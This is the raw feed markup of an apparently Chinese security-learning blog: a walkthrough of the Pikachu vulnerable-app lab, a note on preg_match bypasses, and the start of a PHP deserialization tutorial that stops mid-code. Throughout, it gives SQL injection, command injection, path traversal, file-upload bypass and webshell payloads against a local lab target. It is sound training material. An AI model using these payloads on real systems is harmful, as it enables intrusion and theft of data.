src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230731200242543.png" alt="image-20230731200242543"></p><p>我们直接在浏览器运行一下</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230731200408502.png" alt="image-20230731200408502"></p><p>提交申请，我们直接会跳转到个人中心，并且信息也被修改了</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230731200625952.png" alt="image-20230731200625952"></p><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h3><p>在修改信息时，可以在加一个token参数（随机，每次都不一样）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/csrf/csrftoken/token_get_edit.php?sex=2&amp;phonenum=&amp;add=&amp;email=&amp;token=1436064c7a4e2888e1609686874&amp;submit=submit</span><br></pre></td></tr></table></figure><p>每个token只能用一次，所以我们只能在修改信息前进行抓包，再修改信息。所以，token是防止csrf的一种方式。</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>SQL注入漏洞就是，前端的数据传到后台进行处理时，因没有做严格的过滤，导致数据中的sql语句执行，数据库被攻击。</p><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>数字型不用考虑闭合<code>id=1 or 1=1#</code></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806154234855.png" alt="image-20230806154234855"></p><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>后台查询语句是<code>select id,email from member where username=&#39;$name&#39;</code></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806154412848.png" alt="image-20230806154412848"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=kobe&#x27; //mysql报错</span><br><span class="line">name=kobe&#x27;&#x27; //页面正常，判断为字符型</span><br><span class="line">name=kobe&#x27; or 1=1# //回显所有数据</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806154906784.png" alt="image-20230806154906784"></p><h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>后台查询语句</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806155415980.png" alt="image-20230806155415980"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,id,email from member where username like &#x27;%$name%&#x27;</span><br></pre></td></tr></table></figure><p>构造闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe%&#x27; or 1=1# //回显所有信息</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806155816877.png" alt="image-20230806155816877"></p><h3 id="insert-x2F-update注入"><a href="#insert-x2F-update注入" class="headerlink" title="insert&#x2F;update注入"></a>insert&#x2F;update注入</h3><p>后台语句</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806160254337.png" alt="image-20230806160254337"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into member(username,pw,sex,phonenum,email,address) values(&#x27;&#123;$getdata[&#x27;username&#x27;]&#125;&#x27;,md5(&#x27;&#123;$getdata[&#x27;password&#x27;]&#125;&#x27;),&#x27;&#123;$getdata[&#x27;sex&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;phonenum&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;email&#x27;]&#125;&#x27;,&#x27;&#123;$getdata[&#x27;add&#x27;]&#125;&#x27;)</span><br></pre></td></tr></table></figure><p>这个insert语句我们直接就在<code>住址(Add)</code>这个参数进行注入，闭合前面的sql只需要加入<code>&#39;$payload)</code>(前后分别加入单引号和右括号)</p><p>我们利用updatexml()函数进行报错注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">111&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1))#</span><br></pre></td></tr></table></figure><p>concat是将符号与字符拼接在一起</p><p>0x7e是16进制,是这个符号<code>~</code></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806162153532.png" alt="image-20230806162153532"></p><h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p>后台语句</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806162335917.png" alt="image-20230806162335917"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete from message where id=&#123;$_GET[&#x27;id&#x27;]&#125;</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806162541721.png" alt="image-20230806162541721"></p><p>这是数字型不需要进行闭合</p><p>其余跟insert注入是一样的</p><h3 id="http-header-注入"><a href="#http-header-注入" class="headerlink" title="http header 注入"></a>http header 注入</h3><p>以下是一些常见的请求header：</p><ol><li><p>Accept: 指定客户端能够接收的数据类型，例如text&#x2F;html、image&#x2F;jpeg等。</p></li><li><p>Accept-Encoding: 指定客户端能够接受的编码方式，例如gzip、deflate等。</p></li><li><p>Accept-Language: 指定客户端接受的语言类型，例如en-US，zh-CN等。</p></li><li><p>Connection: 指定客户端与服务器的连接类型，例如keep-alive、close等。</p></li><li><p>Host: 指定请求的服务器的域名和端口号。</p></li><li><p>User-Agent: 指定客户端使用的浏览器类型及版本号。</p></li></ol><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806163203127.png" alt="image-20230806163203127"></p><p>后台语句</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806163236950.png" alt="image-20230806163236950"></p><p>构造闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and updatexml(1,concat(0x7e,(select version()),0x7e),1)--&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806164734474.png" alt="image-20230806164734474"></p><h3 id="基于boolian的盲注"><a href="#基于boolian的盲注" class="headerlink" title="基于boolian的盲注"></a>基于boolian的盲注</h3><p>布尔盲注就是猜测，根据页面返回的true和flase猜数据库总数，猜数据库长度，猜数据库名字，猜表和字段</p><p>输入<code>kobe</code>用户存在，而输入<code>66</code>用户不存在，判断可能存在布尔盲注</p><p>我们可以猜与数据库的长度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and length(database())=6# </span><br><span class="line">kobe&#x27; and length(database())=7# </span><br></pre></td></tr></table></figure><p>当长度等于6时，提示用户不存在，等于7时，正确返回数据，说明数据库长度为7</p><p>我们再用burp爆破数据库的名称，构造payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and substr(database(),1,1)=&#x27;a&#x27;#</span><br><span class="line">substr()是截取字符串的函数</span><br></pre></td></tr></table></figure><p>发送到爆破模块，设置位置</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171336783.png" alt="image-20230806171336783"></p><p>第一个位置</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171418469.png" alt="image-20230806171418469"></p><p>第二个位置</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171440400.png" alt="image-20230806171440400"></p><p>按照顺序拼写出pikachu</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171519438.png" alt="image-20230806171519438"></p><h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>后台语句</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806171713131.png" alt="image-20230806171713131"></p><p>利用sleep()函数和返回时间进行判断是否存在时间盲注</p><p>正常输入，反应时间时15毫秒</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806172038838.png" alt="image-20230806172038838"></p><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and if(length(database())&gt;1,sleep(6),1)#</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806172325802.png" alt="image-20230806172325802"></p><p>花费了6秒，证明可能存在时间盲注</p><p>可判断数据库长度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and if(length(database())&gt;6,sleep(6),1)# //执行了函数，延迟了6秒</span><br><span class="line">kobe&#x27; and if(length(database())&gt;7,sleep(6),1)# //没有执行延迟，证明长度是7</span><br></pre></td></tr></table></figure><p>还可爆破数据库名称,跟布尔盲注是一样操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27; and if(substr(database(),1,1)=&#x27;p&#x27;,sleep(3),1)#</span><br></pre></td></tr></table></figure><h3 id="宽字节注入-wide-byte注入"><a href="#宽字节注入-wide-byte注入" class="headerlink" title="宽字节注入(wide byte注入)"></a>宽字节注入(wide byte注入)</h3><p>一个字节的字符叫做窄字节，两个字节及以上叫宽字节</p><p>宽字节注入是绕过sql防御的一种方法，为了防御sql注入，一些函数可以将单引号、双引号进行转义，转义就是再单引号、双引号前面加上转义字符（\）。</p><p>mysql使用的是GBK编码（两个字节），<code>\</code>的十六进制编码是%5c，前面加%df就可以组成一个繁体字<code>運</code></p><p>过程：</p><p>id&#x3D;1%df’（浏览器自动进行url编码%27）-&gt;%df%27<br> 根据以上分析，发生如下转换：<br> %df%27—&gt;(check_addslashes)—&gt;%df%5c%27—-&gt;(GBK)—-&gt;運</p><p>最后单引号形成闭合</p><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe%df&#x27; or 1=1# //回显所有信息</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806174819990.png" alt="image-20230806174819990"></p><p>接着还可以判断字段数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe%df&#x27; order by 2 //无报错</span><br><span class="line">kobe%df&#x27; order by 3 //有报错</span><br></pre></td></tr></table></figure><p>联合查询进行查询数据库和版本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe%df&#x27; union select database(),version() #</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806175239286.png" alt="image-20230806175239286"></p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统</p><h3 id="exec“ping”"><a href="#exec“ping”" class="headerlink" title="exec“ping”"></a>exec“ping”</h3><p>给了一个ping的框</p><p>尝试ping</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; whoami //两条命令都可以执行</span><br></pre></td></tr></table></figure><p>同时执行多条命令的语法格式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a &amp; b   //先执行a再执行b，无论a是否执行成功(按位与)</span><br><span class="line">a &amp;&amp; b  //先执行a再执行b，只有a执行成功才会执行b(逻辑与)</span><br><span class="line">a || b  //先执行a再执行b，只有a执行失败才会执行b(逻辑或)</span><br><span class="line">a | b   //将a的执行结果传递给b(管道符)</span><br></pre></td></tr></table></figure><h3 id="exec“evel”"><a href="#exec“evel”" class="headerlink" title="exec“evel”"></a>exec“evel”</h3><p>eval() 函数把字符串按照 PHP 代码来计算。</p><p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><p>可以输入<code>phpinfo();</code></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806212321142.png" alt="image-20230806212321142"></p><p>后端代码是直接可以执行的</p><p><code>eval($_POST[&#39;txt&#39;]</code>也算是一句话木马，我们可以通过蚁剑进行连接</p><p>这时候提示数据为空，是因为还有参数没有进行提交</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806213006470.png" alt="image-20230806213006470"></p><p>我们添加一下</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806213211985.png" alt="image-20230806213211985"></p><p>连接成功</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230806213233214.png" alt="image-20230806213233214"></p><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>首先，需要将服务器文件包含功能打开</p><p><img src="C:/Users/86188/AppData/Roaming/Typora/typora-user-images/image-20230812153713038.png" alt="image-20230812153713038"></p><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>只能够对服务器本地的文件进行包含，攻击者大多会读取系统配置文件等</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812152856968.png" alt="image-20230812152856968"></p><p>通过目录遍历可以读取本地文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../1.txt</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812153029599.png" alt="image-20230812153029599"></p><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>可以通过url地址对远程的文件进行包含</p><p>php中有几个文件包含函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(),include_once()</span><br><span class="line">require(),require_once()</span><br></pre></td></tr></table></figure><p>可以在url中输入网址</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812153935437.png" alt="image-20230812153935437"></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812153959732.png" alt="image-20230812153959732"></p><p>还可以通过url的形式读取文件</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812154125229.png" alt="image-20230812154125229"></p><h2 id="不安全的文件下载"><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h2><p>这是下载文件的url</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812154349392.png" alt="image-20230812154349392"></p><p>如果后端没有进行文件名过滤，我们可以直接再filename下载服务器上的任意文件，通过目录遍历。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../1.txt</span><br></pre></td></tr></table></figure><h2 id="不安全的文件上传"><a href="#不安全的文件上传" class="headerlink" title="不安全的文件上传"></a>不安全的文件上传</h2><h3 id="客户端check"><a href="#客户端check" class="headerlink" title="客户端check"></a>客户端check</h3><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812154954700.png" alt="image-20230812154954700"></p><p>查看源码</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812155401123.png" alt="image-20230812155401123"></p><p>发现是前端校验，我们可以禁用js，然后就可以上传.php的文件</p><p>还可以利用抓包改后缀名</p><h3 id="服务端check"><a href="#服务端check" class="headerlink" title="服务端check"></a>服务端check</h3><p>我们可以上传图片，Content-Type: image&#x2F;png</p><p>只需要将后缀名修改成php就行了。也可以上传php文件进行抓包，修改Content-Type。</p><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h3><p>getimagesize()：它是php提供的，通过对目标文件的16进制进行读取，通过该文件的前面几个字符串，来判断文件类型。</p><p>我们可以伪造文件头</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812163754016.png" alt="image-20230812163754016"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作， 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。                </p><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>用户本身可以修改别的用户的信息</p><p>url中的username是lucy，我们可以修改成lili</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812164129473.png" alt="image-20230812164129473"></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230812164311056.png" alt="image-20230812164311056"></p><p>直接跳转到lili的页面，这叫做水平越权</p><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>用户可以拥有管理员的权限，对用户信息进行添加</p><p>我们先登管理员账号，得到添加信息的url</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/pikachu/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure><p>然后退出管理员账号，登录用户账号，访问这个url，依旧可以进行添加用户，这叫垂直越权。</p><h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/pikachu/vul/urlredirect/urlredirect.php?url=</span><br></pre></td></tr></table></figure><p>可以在参数后面直接输入网站进行跳转</p><p>url跳转的危害：</p><p>钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站。</p><h2 id="SSRF-服务器端请求伪造"><a href="#SSRF-服务器端请求伪造" class="headerlink" title="SSRF(服务器端请求伪造)"></a>SSRF(服务器端请求伪造)</h2><p>其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure><h3 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h3><p>查看源码，利用的是curl_exec()函数</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230813172942275.png" alt="image-20230813172942275"></p><h3 id="SSRF-file-get-contents"><a href="#SSRF-file-get-contents" class="headerlink" title="SSRF(file_get_contents)"></a>SSRF(file_get_contents)</h3><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230813173249389.png" alt="image-20230813173249389"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=ssrf.php</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230813173410632.png" alt="image-20230813173410632"></p><p>利用伪协议进行读取文件内容</p><h2 id="XXE-xml外部实体注入"><a href="#XXE-xml外部实体注入" class="headerlink" title="XXE(xml外部实体注入)"></a>XXE(xml外部实体注入)</h2><p>xml是可扩展标记语言</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; //声明是xml</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt; //外部实体声明</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Dave&lt;/to&gt;</span><br><span class="line">&lt;from&gt; Tom&lt;/from&gt;</span><br><span class="line">&lt;head&gt; Reminder &lt;/head&gt;</span><br><span class="line">&lt;body&gt;You are a good man&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>判断是否有xxe回显漏洞</p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;aa&gt;aa&lt;/aa&gt;</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230813180132480.png" alt="image-20230813180132480"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>preg_match绕过和神奇的unicode编码</title>
      <link href="/post/6c198c6.html"/>
      <url>/post/6c198c6.html</url>
      
        <content type="html"><![CDATA[<h2 id="什么是preg-match"><a href="#什么是preg-match" class="headerlink" title="什么是preg_match"></a>什么是preg_match</h2><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230531203342124.png" alt="image-20230531203342124"></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230531203403865.png" alt="image-20230531203403865"></p><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><h3 id="1、数组绕过"><a href="#1、数组绕过" class="headerlink" title="1、数组绕过"></a>1、数组绕过</h3><p>preg_match只能处理字符串，当传入的subject是数组时会返回false</p><h3 id="2、PCRE回溯次数限制"><a href="#2、PCRE回溯次数限制" class="headerlink" title="2、PCRE回溯次数限制"></a>2、PCRE回溯次数限制</h3><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">戳我</a></p><h2 id="神奇的Unicode编码"><a href="#神奇的Unicode编码" class="headerlink" title="神奇的Unicode编码"></a>神奇的Unicode编码</h2><p>这个符号竟然可以从右往左打印字符串</p><p><a href="https://xiinnn.com/article/22d50835.html">看我看我</a></p><p>在网页中复制下来，方框中的</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230531204146074.png" alt="image-20230531204146074"></p><p>放进编译器中，使用urlencode进行输出即可</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/post/8ac6c1a1.html"/>
      <url>/post/8ac6c1a1.html</url>
      
        <content type="html"><![CDATA[<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>序列化就是将 对象object、字符串string、数组array、变量 转换成具有一定格式的字符串，方便保持稳定的格式在文件中传输，以便还原为原来的内容。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span> = <span class="string">&quot;aa&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;bb&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:4:&quot;flag&quot;;s:7:&quot;%00Flag%00a&quot;;s:2:&quot;aa&quot;;s:4:&quot;%00*%00b&quot;;s:2:&quot;bb&quot;;&#125;</span><br></pre></td></tr></table></figure><p>这里面O代表对象；4代表对象名长度；Flag是对象名；3是对象里面的成员变量的数量；同时注意到类里面的方法并不会序列化。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意：当访问控制修饰符(public、protected、private)不同时，序列化后的结果也不同，`%00` 虽然不会显示，但是提交还是要加上去。</span><br><span class="line"></span><br><span class="line">public : 被序列化的时候属性名 不会更改</span><br><span class="line"></span><br><span class="line">protected : 被序列化的时候属性名 会变成 %00*%00属性名</span><br><span class="line"></span><br><span class="line">private : 被序列化的时候属性名 会变成 %00类名%00属性名</span><br><span class="line"></span><br><span class="line">输出时一般需要url编码，若在本地存储更推荐采用base64编码的形式</span><br></pre></td></tr></table></figure><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>反序列化就是序列化的逆过程。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span> = <span class="string">&quot;aa&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;bb&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$c1</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c1</span>;</span><br><span class="line"><span class="variable">$c2</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$c1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$c2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:4:&quot;flag&quot;;s:7:&quot; Flag a&quot;;s:2:&quot;aa&quot;;s:4:&quot; * b&quot;;s:2:&quot;bb&quot;;&#125;object(Flag)#2 (3) &#123;</span><br><span class="line">  [&quot;file&quot;]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [&quot;a&quot;:&quot;Flag&quot;:private]=&gt;</span><br><span class="line">  string(2) &quot;aa&quot;</span><br><span class="line">  [&quot;b&quot;:protected]=&gt;</span><br><span class="line">  string(2) &quot;bb&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20240118202217451.png" alt="image-20240118202217451"></p><p>反序列化漏洞里会有一些魔术方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><p>知识点：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__serialize和__unserialize魔术方法</span><br><span class="line">注意:</span><br><span class="line">1.这两个魔术方法需要php7.4以上才能生效</span><br><span class="line">2.当__serialize和__sleep方法同时存在，序列化时忽略__sleep方法而执行__serialize;</span><br><span class="line">3.当__unserialize方法和__wakeup方法同时存在，反序列化时忽略__wakeup方法而执行__unserialize;</span><br><span class="line">4.__unserialize的参数：当__serialize方法存在时，参数为__serialize的返回数组；当__serialize方法不存在时，参数为实例对象的所有属性值组合而成的数组</span><br></pre></td></tr></table></figure><h2 id="PHP反序列化POP链"><a href="#PHP反序列化POP链" class="headerlink" title="PHP反序列化POP链"></a>PHP反序列化POP链</h2><h3 id="POP链介绍"><a href="#POP链介绍" class="headerlink" title="POP链介绍"></a>POP链介绍</h3><p>从源代码中寻找一系列的代码或者指令调用，魔术方法的调用，然后根据需求构成一组连续的调用链，完成攻击的目的。</p><h3 id="POP链demo"><a href="#POP链demo" class="headerlink" title="POP链demo"></a>POP链demo</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./xxxiscc.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">boy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$like</span>;</span><br><span class="line">    <span class="keyword">public</span> <span 